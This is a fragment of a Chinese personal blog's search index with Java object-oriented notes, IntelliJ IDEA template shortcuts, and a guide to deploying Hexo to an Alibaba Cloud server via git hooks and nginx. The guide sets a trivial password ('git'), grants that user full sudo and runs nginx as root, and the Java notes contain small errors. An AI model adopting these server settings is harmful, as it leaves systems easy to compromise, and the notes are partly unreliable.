<p>代码满足的时候发生代码重写<br>3. 一，方法重写发生在具有继承关系的父子类之间<br>二，返回值类型相同，方法名相同，形参列表相同</p>
<ol start="4">
<li><p>方法重新的时候用复制粘贴</p>
</li>
<li><p>访问权限不能低，可以更高</p>
</li>
<li><p>抛出的异常不能更多可以更少。</p>
</li>
<li><p>注意<br>私有方法不能继承，所以不能覆盖。<br>构造方法不能继承，所以不能覆盖。<br>静态方法不能继承，所以不能覆盖。<br>覆盖只针对方法，不谈属性。</p>
</li>
</ol>
<h1 id="java语言的三大特征"><a href="#java语言的三大特征" class="headerlink" title="java语言的三大特征"></a>java语言的三大特征</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装的好处：<br>1，封装之后，对于那个实物来说，看不到这个事物复杂的一面，只能看到事物简单的一面，复杂性封装，对外提供简单的操作入口<br>2，封装之后形成真正的对象，真正的独立体<br>3，封装意味着以后的程序可以重复使用。并且这个是我应该适应性比较强。在任何场合都可以使用<br>4封装以后，对于事物本身提高了安全级别</p>
<p>封装的步骤：<br>1，对所有属性私有化，使用private修饰词<br>2，对外提供简单访问入口<br>get–&gt;输出<br>Set–&gt;修改</p>
<p><mark>&#x2F;，settre 与 getter方法没有static关键字<br>有static关键字修饰的方法调用：类名，方法名（实参）<br>无static关键字修饰的方法调用：引用，方法名（实参）</mark></p>
<p>IDEA中直接一键封装</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>Java语言中的继承</p>
<ol>
<li>继承是面向对象三大特征之一</li>
<li>继承”基本”的作用是：代码复用。但是继承最”重要”的是：有了继承才有了以后，方法的覆盖和多态机制</li>
<li>java语言中继承只支持单继承，一个类不能同时继承很多类，只能继承一个类，在C++支持多继承</li>
<li>关于继承中的一些术语<br>B类继承A类，其中：<br>A类称为：父类，基类，超类，superclass<br>B类称为：子类，派生类，subclass</li>
<li>在java语言当中子类继承父类都继承那些数据呢？<br>—私有的不支持继承<br>—构造方法不支持继承<br>—其他数据都可以被继承</li>
<li>虽然java语言当中只支持单继承但是一个类也可以间接继承其他类，例如：<br>C extends b{<br>}<br>B extends  A{<br>}<br>A extends T{<br>}<br>C类间直继承B类，但是C类间接继承TA类</li>
<li>java语言中假设一个类没有显示的任何继承类，该类默认继承javaSE库当中提供的java.lang.Object类</li>
</ol>
<p>子类继承父类的所有属性和方法，但是不能直接访问private</p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>java语言中的多态语法机制<br>1.ABC三个类之间的关系：<br>B类继承A类<br>C类继承A类<br>B，C之间没有任何继承关系</p>
<p>2.关于多态中涉及到的几个概念</p>
<p>向上转型（upcasting）                             B b2 &#x3D; new A<br>子类型 –&gt;父类型<br>又被称为：自动类型转换</p>
<p>向下转型（downcasting）<br>父类型–&gt;子类型<br>又被称为：强制类型转换【需要加强制类型转换符】</p>
<p><mark>无论是向上转型还是向下转型，两种类型之间必须要用继承关系。<br>没有继承关系，程序是无法编译通过的</mark></p>
<ol>
<li>Java程序永远都分为编译阶段和运行阶段</li>
<li>先分析编译阶段，在分析运行阶段，编译无法通过，根本是无法运行的A。class</li>
</ol>
<p>A a2 &#x3D; new B</p>
<p>静态绑定，编译过程中绑定，静态绑定之后才有后续运行</p>
<ol start="3">
<li>在程序运行阶段，JVM堆内存中真实绑定的是B对象，那么以下程序在运行阶段一定会调用B对象的方法，此时发生了动态绑定，运行阶段绑定。</li>
</ol>
<p><mark>底层是什么对象就调对象的什么方法</mark></p>
<ol start="4">
<li>父类型引用指向子类型对象这种机制导致程序存在编译阶段绑定和运行阶段绑定两种不同的形态&#x2F;状态，这种机制可以成为一种多态语法机制</li>
</ol>
<p>需要向下转型的时候<br><mark>当调用的方法是子类型中特有的，在父类型当中不存在，必须向下转型</mark></p>
<p>用强制转换类型，向下转型，程序虽然通过了，但是程序在运行阶段会出现异常，因为JVM堆内存当中真实存在的对象是Bird类型，Bird对象无法转换成Cat对象，因为两种类型之间不存在任何继承关系，此时出现了著名的异常：</p>
<ul>
<li><pre><code>  java.lang.classcastexception
</code></pre>
</li>
<li>类型转换异常，这种异常总是在”向下转型”的时候会发生<blockquote>
<p>次异常只会出现在”向下转型”，说明”向下转型”存在隐患（编译过了，但是存在运行错误）</p>
</blockquote>
</li>
</ul>
<p>1，向上转型只有编译过了，运行一定不会出问题<br>2，向下转型编译过了，运行可能存在错误</p>
<p>避免向下转型出现的异常</p>
<p>使用instanceof运算符可以避免次异常</p>
<p>instanceof语法格式：引用 instanceof 数据类型名<br>以上运算符的执行结果是布尔类型，结果可能是true&#x2F;false</p>
<p>关于运算结果true&#x2F;false<br>假设：（a instanceof Animal）<br>true表示<br>a这个引用指向的一个对象是一个Animal类型<br>false表示<br>a这个引用指向的一个对象不是一个Animal类型</p>
<p>在使用强制类型转换符之前，使用instanceof运算符进行判断，避免classcastexception异常发生</p>
]]></content>
      <categories>
        <category>语言学习总结</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA快捷生成代码</title>
    <url>/JAVA/IDEA%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备吧JAVA作为主要使用语言写POC，所有记一下</p>
<span id="more"></span>

<h1 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h1><pre><code>//生成main方法:
public static void main(String[] args) &#123;&#125;
</code></pre>
<h1 id="sout"><a href="#sout" class="headerlink" title="sout"></a>sout</h1><pre><code>//生成打印输出:
System.out.println();
</code></pre>
<h1 id="“abc”-sout"><a href="#“abc”-sout" class="headerlink" title="“abc”.sout"></a>“abc”.sout</h1><pre><code>//生成打印字符串:
System.out.println(&quot;adc&quot;);
</code></pre>
<h1 id="“abc”-format"><a href="#“abc”-format" class="headerlink" title="“abc”.format"></a>“abc”.format</h1><pre><code>//生成字符串格式化:
String.format(&quot;abc&quot; )
</code></pre>
<h1 id="itli"><a href="#itli" class="headerlink" title="itli"></a>itli</h1><pre><code>    //生成for循环
 for (int i = 0; i &lt; list.size(); i++) &#123;
    String s =  list.get(i);
 &#125;
</code></pre>
<h1 id="itco"><a href="#itco" class="headerlink" title="itco"></a>itco</h1><pre><code>   /// 生成Collection迭代器
 for (Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext(); ) &#123;
     String next =  iterator.next();   
 &#125;
</code></pre>
<h1 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h1><pre><code>   ///生成增强for循环
 for (String s : list) &#123;       
 &#125;
</code></pre>
<h1 id="iten"><a href="#iten" class="headerlink" title="iten"></a>iten</h1><pre><code>    ///生成 enumeration遍历
 while (enumeration.hasMoreElements()) &#123;
    Object nextElement =  enumeration.nextElement();   
 &#125;
</code></pre>
<h1 id="itar"><a href="#itar" class="headerlink" title="itar"></a>itar</h1><pre><code>    ///生成数组for循环
 int[] array = &#123;12345&#125;;
 for (int i = 0; i &lt; array.length; i++) &#123;
    int i1 = array[i]; 
 &#125;
</code></pre>
<h1 id="itit"><a href="#itit" class="headerlink" title="itit"></a>itit</h1><pre><code>  ///生成迭代器 iterator
 Iterator iterator = list.iterator();
 while (iterator.hasNext()) &#123;
    Object next =  iterator.next();
 &#125;
</code></pre>
<h1 id="ittok"><a href="#ittok" class="headerlink" title="ittok"></a>ittok</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   //ittok  生成String token遍历</span><br><span class="line">for (StringTokenizer stringTokenizer = new StringTokenizer(APP_NAME); stringTokenizer.hasMoreTokens(); ) &#123;</span><br><span class="line">   String s = stringTokenizer.nextToken();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="itws"><a href="#itws" class="headerlink" title="itws"></a>itws</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成Axis2 web service调用</span><br><span class="line">try &#123;</span><br><span class="line">    MyServiceLocator locator = new MyServiceLocator();</span><br><span class="line">    Activator service = locator.get();</span><br><span class="line">    // If authorization is required</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setUsername(&quot;user3&quot;);</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setPassword(&quot;pass3&quot;);</span><br><span class="line">    // invoke business method</span><br><span class="line">    service.businessMethod();</span><br><span class="line">&#125; catch (javax.xml.rpc.ServiceException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125; catch (java.rmi.RemoteException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="try-如-”abc”-try"><a href="#try-如-”abc”-try" class="headerlink" title="try 如:”abc”.try"></a>try 如:”abc”.try</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// 生成try.....catch</span><br><span class="line">     try &#123;</span><br><span class="line">         &quot;abc&quot;</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h1 id="ifn"><a href="#ifn" class="headerlink" title="ifn"></a>ifn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否为空  </span><br><span class="line">  if (list == null) &#123;</span><br><span class="line">  &#125;2</span><br></pre></td></tr></table></figure>

<h1 id="inn"><a href="#inn" class="headerlink" title="inn"></a>inn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否不为空  </span><br><span class="line"> if (list != null) &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="fori"><a href="#fori" class="headerlink" title="fori"></a>fori</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成简单for循环</span><br><span class="line">  for (int i = 0; i &lt; ; i++) &#123; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="inst"><a href="#inst" class="headerlink" title="inst"></a>inst</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成是否是该对象引用</span><br><span class="line"> if (list instanceof Object) &#123;</span><br><span class="line">      Object o = (Object) list; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="psf"><a href="#psf" class="headerlink" title="psf"></a>psf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的</span><br><span class="line"> public static final</span><br></pre></td></tr></table></figure>

<h1 id="psfi"><a href="#psfi" class="headerlink" title="psfi"></a>psfi</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 int</span><br><span class="line"> public static final int </span><br></pre></td></tr></table></figure>

<h1 id="psfs"><a href="#psfs" class="headerlink" title="psfs"></a>psfs</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 String</span><br><span class="line"> public static final String </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语言学习总结</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo部署到阿里云服务器</title>
    <url>/bolg/hexo%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>域名还没下来，就先用gitee，但是先记录一下自己hexo部署过程o(<em>￣▽￣</em>)o</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>这里说一下vim的基本操作方便不会的同学进行搭建<br>i–&gt;编辑<br>按一下ESC输入:wq–&gt;保存并退出（冒号也要输入啊！）<br>按一下ESC输入:!wq–&gt;保存并强制退出</p>
</blockquote>
<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
<li>本地hexo构建可运行发布</li>
<li>阿里云服务器能访问</li>
<li>有一个域名(非必须项，可以公网ip查看嘛~)</li>
<li>Xshell和Xftp且已连接至服务器（怎么连接自行百度，这里就不做过多讲解）</li>
</ul>
<h3 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h3><ul>
<li>Ubantu 20.04</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li>回顾一下Hexo发布到gitee（Pages）的流程：</li>
<li>本地计算机用Hexo构建静态文件public</li>
<li>关键一步就是git上传github或gitee</li>
<li>发布Pages将仓库目录<a href="https://gitee.com/cungudafa/cungudafa/index.html%E6%8B%89%E5%8F%96%E5%88%B0https://cungudafa.gitee.io/index.html">https://gitee.com/cungudafa/cungudafa/index.html拉取到https://cungudafa.gitee.io/index.html</a></li>
</ul>
<p><img src="https://s3.ax1x.com/2020/12/06/DXOrtg.png"><br>当然我们需要上传的是public文件夹；每次xftp手动上传肯定是不现实且麻烦的，所以我们接下来要在服务器安装git。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务器创建服务器创建git用户"><a href="#服务器创建服务器创建git用户" class="headerlink" title="服务器创建服务器创建git用户"></a>服务器创建服务器创建git用户</h3><h4 id="创建一个git用户，用来运行git服务。（root不安全）"><a href="#创建一个git用户，用来运行git服务。（root不安全）" class="headerlink" title="创建一个git用户，用来运行git服务。（root不安全）"></a>创建一个git用户，用来运行git服务。（root不安全）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd git -m</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：Ubantu下必须加上-m，才会自动新建用户目录&#x2F;home&#x2F;git&#x2F;（后面配置和博客文件都放在这里）<br>在&#x2F;home&#x2F;git&#x2F;非常重要，如果出错，可以删除sudo userdel -r git用户，重新之前的步骤。</p>
</blockquote>
<h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<p>密码就是git吧，简单为上。</p>
<h4 id="增加git用户执行sudo的权限"><a href="#增加git用户执行sudo的权限" class="headerlink" title="增加git用户执行sudo的权限"></a>增加git用户执行sudo的权限</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
<p>找到以下内容：root ALL&#x3D;(ALL) ALL在下面添加一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
<p>保存退出后改回权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure>

<h3 id="服务器打开RSA认证"><a href="#服务器打开RSA认证" class="headerlink" title="服务器打开RSA认证"></a>服务器打开RSA认证</h3><p>RSA用公钥加密，私钥解密，成为加密通信。<br>用私钥加密，公钥解密，就是认证。（这样就能证明消息是你发出的。）<br>因为：公钥大家都有，私钥就只有一个，在你自己手里。<br><img src="https://s3.ax1x.com/2020/12/06/DXzRTP.png"></p>
<h4 id="开启认证配置"><a href="#开启认证配置" class="headerlink" title="开启认证配置"></a>开启认证配置</h4><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<p>在sshd_config中开启以下几项：(前两项yes，后一项修改为如下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>重启sshd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop sshd.service</span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>
<h4 id="建立ssh信任关系"><a href="#建立ssh信任关系" class="headerlink" title="建立ssh信任关系"></a>建立ssh信任关系</h4><p>本地电脑生成秘钥对-&gt;发送公钥到服务器-&gt;本地可免密连接服务器</p>
<h5 id="在本地电脑-生成密钥对"><a href="#在本地电脑-生成密钥对" class="headerlink" title="在本地电脑:生成密钥对"></a>在本地电脑:生成密钥对</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot; </span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjSY9S.png"><br>成功后，会在c盘用户下新建秘钥对：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjSrNV.png"></p>
<h5 id="在服务器-切换至git用户，创建-x2F-ssh-文件夹"><a href="#在服务器-切换至git用户，创建-x2F-ssh-文件夹" class="headerlink" title="在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹"></a>在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br></pre></td></tr></table></figure>
<p>或者root用户直接创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>

<h5 id="在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys"><a href="#在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys" class="headerlink" title="在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys"></a>在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i C:/Users/CUNGU/.ssh/id_rsa.pub git@47.93.50.90 //把公钥发送给服务器</span><br><span class="line">ssh git@47.93.50.90 // 测试能否登录</span><br></pre></td></tr></table></figure>
<p>服务器文件夹也有了公钥：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpPgg.png"></p>
<h5 id="文件夹权限调整：authorzied-keys权限为600时才生效"><a href="#文件夹权限调整：authorzied-keys权限为600时才生效" class="headerlink" title="文件夹权限调整：authorzied_keys权限为600时才生效"></a>文件夹权限调整：authorzied_keys权限为600时才生效</h5><p>git用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorzied_keys</span><br></pre></td></tr></table></figure>
<p>第二步没有成功，说我没有权限（Permission denied）；emmm，root设置好了</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpK8U.png"><br>root设置第二步：(注意在.ssh目录下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit // 退出到 root 登录</span><br><span class="line">sudo chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Djp2Pf.png"><br>现在就搭建好git桥梁，为后面实现hexo d部署时，可以自动上传啦！</p>
<h3 id="创建blog-git空仓库"><a href="#创建blog-git空仓库" class="headerlink" title="创建blog.git空仓库"></a>创建blog.git空仓库</h3><h4 id="切换到git用户，接下来都是在git用户权限下进行操作："><a href="#切换到git用户，接下来都是在git用户权限下进行操作：" class="headerlink" title="切换到git用户，接下来都是在git用户权限下进行操作："></a>切换到git用户，接下来都是在git用户权限下进行操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git                //切换git用户</span><br><span class="line">cd /home/git/</span><br><span class="line">mkdir -p projects/blog  //创建你的博客目录</span><br><span class="line">mkdir repos &amp;&amp; cd repos</span><br><span class="line">git init --bare blog.git  //创建一个空仓库</span><br><span class="line">cd blog.git/hooks</span><br><span class="line">vi post-receive  //创建hook钩子函数，输入以下内容</span><br><span class="line">git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f</span><br><span class="line">chmod +x post-receive  // 修改钩子函数权限</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj98SS.png"></p>
<h4 id="改变-hexo-git-目录的拥有者为git用户："><a href="#改变-hexo-git-目录的拥有者为git用户：" class="headerlink" title="改变 hexo.git 目录的拥有者为git用户："></a>改变 hexo.git 目录的拥有者为git用户：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chown -R git:git blog.git</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj9BWT.png"></p>
<h5 id="添加备份目录"><a href="#添加备份目录" class="headerlink" title="添加备份目录"></a>添加备份目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/projects/</span><br><span class="line">mkdir -p tmp/blog</span><br></pre></td></tr></table></figure>
<p>修改钩子的内容：（重点是git clone 克隆到主目录home&#x2F;git&#x2F;projects&#x2F;blog主目录要配置到nginx中去的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">GIT_REPO=/home/git/repos/blog.git    # git仓库</span><br><span class="line">TMP_GIT_CLONE=/home/git/projects/tmp/blog</span><br><span class="line">PUBLIC_WWW=/home/git/projects/blog  # 网站目录</span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br><span class="line">chmod +x post-receive          # 赋予脚本的执行权限</span><br></pre></td></tr></table></figure>
<p>git用户赋权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod +x post-receive</span><br><span class="line">exit // 退出到 root 登录</span><br><span class="line">chown -R git:git /home/git/repos/blog.git // 添加权限</span><br><span class="line">sudo chown git:git -R /home/git/projects/</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjCPmj.png"></p>
<p>蓝色为更新后的上传机制：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCncF.png"></p>
<p>为了安全起见，我们需要关闭git账号登录shell的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/passwd</span><br></pre></td></tr></table></figure>
<p>找到git账号(一般在最后面)添加：&#x2F;usr&#x2F;bin&#x2F;git-shell</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCl7R.png"></p>
<p>加上git就只能git clone，如需shell操作，撤销&#x2F;usr&#x2F;bin&#x2F;git-shell即可。</p>
<p>####在本地任意一空目录，测试git仓库是否可用（测试步骤，稍后可清除）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@48.53.57.50:/home/git/repos/blog.git</span><br></pre></td></tr></table></figure>

<p>实际拉下来的是你的&#x2F;home&#x2F;git&#x2F;projects&#x2F;blog，哈哈哈还是空的~</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjC3A1.png"></p>
<h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><p>修改博客根目录配置_config.yml，部署部分，增添repo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  message: update</span><br><span class="line">  gitee: https://gitee.com/cungudafa/cungudafa.git</span><br><span class="line">  repo: git@48.53.57.50:/home/git/repos/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<blockquote>
<p>只有在ssh秘钥配置成功，才能成功上传。如果需要修改公钥，要打开git操作shell的权限哦！vim &#x2F;etc&#x2F;passwd最后一句。及时开，及时关，做到万无一失。</p>
</blockquote>
<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><ul>
<li>到这里，我发现一个问题，用源码安装和sudo apt install nginx安装，文件结构是不同的</li>
<li>这里我选择的是sudo apt install nginx的方式安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
<p>修改用户为root用户</p>
<p><img src="https://s3.ax1x.com/2020/12/06/Dji6Og.png"></p>
<p>1.端口号（阿里云控制台安全组规则要打开端口哦）<br>2.修改域名<br>3.修改根目录位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/06/DjFPne.png"></p>
<blockquote>
<p>到这里只要重启nginx就可以了，但是我没发现sbin文件，就从进程重启了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -HUP 进程号</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjF69x.png"></p>
<p>接下来就可以用域名或者公网IP访问了</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
